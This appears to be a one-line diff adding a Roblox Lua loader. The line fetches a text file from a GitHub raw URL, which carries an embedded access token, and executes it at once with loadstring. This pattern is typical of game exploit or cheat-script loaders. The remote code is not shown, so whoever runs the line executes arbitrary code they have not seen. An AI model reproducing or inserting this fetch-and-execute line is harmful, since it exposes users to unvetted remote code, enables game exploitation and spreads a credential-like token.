@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jakdhbeosu/Calyd/refs/heads/main/Akdjnska.txt?token=GHSAT0AAAAAACZSA6SC3RRQ72B24UJN6MCGZZPHXXA",true))()
